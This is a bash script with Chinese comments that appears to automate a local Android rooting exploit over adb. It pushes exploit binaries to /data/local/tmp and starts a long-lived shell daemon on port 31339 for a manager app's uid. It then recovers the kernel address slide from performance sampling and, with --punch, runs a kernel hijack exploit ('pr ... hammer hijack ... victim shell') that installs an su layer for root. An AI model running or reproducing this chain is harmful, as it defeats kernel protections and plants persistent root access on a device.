#!/bin/bash
# bootstrap.sh — 开机后一条命令把"能激活"的状态摆好:
#   等 boot_completed → 等负载降 → 铺 payload → 起 shd → 采 25s → 解 slide(带 boot_id 缓存)
# 有线/无线都一样, 只是 DEV 的写法不同:
#   有线:  ./bootstrap.sh                      (用默认序列号)
#   无线:  adb pair 192.168.1.20:37111 123456  # 只需配一次, 配对信息跨重启有效
#          adb connect 192.168.1.20:42399      # 端口每次开机变(无线调试是随机端口)
#          DEV=192.168.1.20:42399 ./bootstrap.sh
# 想连打链也在命令行做完:  I_KNOW=1 ./bootstrap.sh --punch   (会花掉本 boot 唯一一发)
set -u
cd "$(dirname "$0")/.." || exit 1          # 项目根
# 可移植：默认 adb/python 走 PATH、设备自动探测；特殊环境用环境变量覆盖：ADB=/path/adb DEV=<序列号> PY=/path/python
ADB="${ADB:-adb}"
DEV="${DEV:-$($ADB devices 2>/dev/null | awk 'NR>1 && $2=="device"{print $1; exit}')}"
[ -n "$DEV" ] || { echo "[x] 找不到在线设备（adb devices 无 device 态）。可用 DEV=<序列号> 指定。"; exit 1; }
PY="${PY:-python}"
T() { MSYS2_ARG_CONV_EXCL='*' "$ADB" -s "$DEV" "$@"; }
S() { T shell "$1" 2>&1 | tr -d '\r'; }          # 判据一律用"捕获输出", adb shell 的退出码不可信
MANAGER=com.suw.manager
LOAD_MAX=${LOAD_MAX:-6}
TAG=$(date +%m%d_%H%M)
PUNCH=0
[ "${1:-}" = "--punch" ] && PUNCH=1

# ---- 0. 设备在不在 --------------------------------------------------------
if [ -z "$(T get-state 2>/dev/null | tr -d '\r' | grep device)" ]; then
  echo "[x] 找不到设备 $DEV。无线的话先:  adb connect <ip>:<port>(端口在'无线调试'设置页里看)"
  exit 1
fi
echo "[i] 设备 $DEV 在线"

# ---- 1. 等开机完成 + 等负载降 --------------------------------------------
# 为什么必须等: 开机风暴里 punch 的失败率明显高(记忆: reboot 后实测要等 ~227s 才稳)
for i in $(seq 1 40); do
  [ "$(S 'getprop sys.boot_completed')" = "1" ] && break
  sleep 3
done
for i in $(seq 1 60); do
  L1=$(S "cut -d' ' -f1 /proc/loadavg")
  OK=$(S "awk '\$1<'$LOAD_MAX'{print 1}' /proc/loadavg")
  [ "$OK" = "1" ] && { echo "[i] 负载已降: load1=$L1 (uptime=$(S 'cut -d" " -f1 /proc/uptime'))"; break; }
  [ "$i" = 60 ] && { echo "[x] 等了 5 分钟 load1 还是 $L1 ≥ $LOAD_MAX; 先别让手机闲着, 或 LOAD_MAX=8 再来"; exit 1; }
  sleep 5
done

# ---- 2. 铺 payload(缺才推; 已在跑的 shd 要先按 pid 停掉) ------------------
# 坑: pkill -f 的模式会匹配到"执行这条命令的 shell 自己"(它的 cmdline 里含同样的字符串),
#     结果 shell 先死、后面的命令根本没跑。⇒ 一律 pidof 再按 pid 杀。
for p in $(S 'pidof shd'); do S "kill $p"; done
MISS=""
for f in pr sudbin shd perfips asuid su_layer_install.sh; do
  [ -z "$(S "ls /data/local/tmp/$f 2>/dev/null")" ] && MISS="$MISS $f"
done
SRC=cm57
if [ -n "$MISS" ]; then
  echo "[i] 推送缺失的 payload:$MISS"
  for f in $MISS; do
    case "$f" in
      # 本地产物名和设备上名不一致 —— 这三个必须显式映射, 否则"设备上缺文件"时 bootstrap 会
      # 报"本地没有 cm57/pr"然后退出(设备上的旧副本一旦被我自己的收尾脚本 rm 掉就抓瞎)
      shd)     L=suw_apk/shdbin ;;
      asuid)   L=$SRC/asuidbin ;;
      pr)      L=$SRC/prbin ;;
      perfips) L=$SRC/perfips ;;      # 设备是唯一副本; 源码见 cm54/slide.c, 别把它当可有可无的
      *)       L=$SRC/$f ;;
    esac
    [ -f "$L" ] || { echo "[x] 本地没有 $L —— 先 bash suw_apk/build.sh"; exit 1; }
    T push "$L" "/data/local/tmp/$f.new" >/dev/null || { echo "[x] push $f 失败"; exit 1; }
    S "mv -f /data/local/tmp/$f.new /data/local/tmp/$f; chmod 755 /data/local/tmp/$f" >/dev/null
  done
fi
# 版本对齐: 本地 sudbin/pr 比设备上新的话就换掉(否则控制面/相0 的改动不生效)
for f in pr sudbin; do
  L=$SRC/$f; [ "$f" = sudbin ] && L=suw_apk/sudbin
  [ -f "$L" ] || continue
  if [ "$(md5sum "$L" | cut -d' ' -f1)" != "$(S "md5sum /data/local/tmp/$f 2>/dev/null" | cut -d' ' -f1)" ]; then
    echo "[i] 更新 $f"
    T push "$L" "/data/local/tmp/$f.new" >/dev/null && S "mv -f /data/local/tmp/$f.new /data/local/tmp/$f; chmod 755 /data/local/tmp/$f" >/dev/null
  fi
done

# ---- 3. 起 agent, 并把 manager 自己的 uid 加进它的 unix 白名单 ------------
UID_M=$(S "pm list packages -U | grep -w $MANAGER | grep -o 'uid:[0-9]*' | cut -d: -f2")
[ -n "$UID_M" ] || { echo "[x] 查不到 $MANAGER 的 uid(没装?)"; exit 1; }
S "setsid nohup /data/local/tmp/shd 31339 2147483647 $UID_M </dev/null >>/data/local/tmp/shd.log 2>&1 &" >/dev/null  # 持久: idle 1800→2147483647, 活到硬重启(用户 02:2x 定, 贴合社区常驻模型)
sleep 2
echo "[i] agent: $(S 'tail -1 /data/local/tmp/shd.log')"
echo "[i] manager uid=$UID_M  enforce=$(S getenforce)  uname -s=[$(S 'uname -s')]"

# ---- 4. 解 slide(带 boot_id 缓存) ----------------------------------------
# slide 是 per-boot 的; boot_id 是 uid2000 就能读的 ⇒ 天然的缓存键。
# 缓存有效性还要看"这个 boot 还没打过链"—— 判据就是 uname -s 仍是 Linux(相0 会污染它)。
BOOT=$(S 'cat /proc/sys/kernel/random/boot_id')
CACHE=analysis/slide_cache
mkdir -p "$CACHE"
CF=$CACHE/$BOOT.txt
if [ -s "$CF" ] && [ "$(S 'uname -s')" = "Linux" ]; then
  echo "[i] 用缓存的 slide(同一 boot): $(cat "$CF")"
  SLIDE=$(cat "$CF")
else
  echo "[*] 采样 25s(期间别拔线、别开重活)..."
  S "rm -f /data/local/tmp/ipk.txt; /data/local/tmp/perfips 25 > /data/local/tmp/ipk.txt 2>&1; wc -l < /data/local/tmp/ipk.txt"
  T pull /data/local/tmp/ipk.txt "$CACHE/ipk_$TAG.txt" >/dev/null
  OUT=$("$PY" analysis/slide_pc.py "$CACHE/ipk_$TAG.txt" 2>&1 | tail -3)
  echo "$OUT" | sed 's/^/    /'
  SLIDE=$(echo "$OUT" | grep -oE '^SLIDE [0-9a-f]+' | awk '{print $2}')
  [ -n "$SLIDE" ] || { echo "[x] 没解出 slide ⇒ 不写缓存、不往下走(绝不猜)"; exit 2; }
  echo "$SLIDE" > "$CF"; rm -f "$CACHE/ipk_$TAG.txt"
  echo "[i] slide=$SLIDE 已按 boot_id 缓存"
fi

echo
echo "下一步:"
echo "  A) 手机上: 打开『SU 白名单』→ 激活页 → ③ 打链(推荐, 界面上有进度与日志)"
echo "  B) 命令行: I_KNOW=1 $0 --punch"
if [ "$PUNCH" != 1 ]; then exit 0; fi
[ "${I_KNOW:-}" = 1 ] || { echo "[x] --punch 会花掉本 boot 唯一一发且有重启风险; 设 I_KNOW=1 再来"; exit 1; }
echo "[!] 5 秒后从命令行发 PUNCH (Ctrl-C 取消)"
sleep 5
S "cd /data/local/tmp && rm -f punch.log && setsid nohup sh -c './pr $SLIDE hammer hijack shape2 sen victim shell ph2=0 ncopy5 shots=25 maxr=8 nph=7 rounds=200 wcpu=6 mcpu=0 post=/data/local/tmp/ksu_post.sh > /data/local/tmp/punch.log 2>&1; echo RC=\$? >> /data/local/tmp/punch.log' </dev/null >/dev/null 2>&1 & echo dispatched"
for i in $(seq 1 40); do
  sleep 15
  R=$(S 'printf "pr=%s enforce=%s s=[%s] layer=%s tail=%s" "$(pidof pr)" "$(getenforce)" "$(uname -s)" "$([ -f /data/local/tmp/su_layer.log ] && echo Y || echo N)" "$(tail -c 60 /data/local/tmp/punch.log 2>/dev/null | tr -d "\r\n")"')
  echo "  [$((i*15))s] $R"
  case "$R" in *"pr= "*) break;; esac
done
echo "=== 装层结果 ==="
S 'grep -a "LAYER_READY\|授权后\|已写 /data/adb/su/su.ctrl" /data/local/tmp/su_layer.log 2>&1 | tail -4'
echo "=== 收尾 ==="
echo "  用完记得: bash cm57/round9_cleanup.sh   (趁 root 还活着删 /data/adb/su, 再 reboot)"
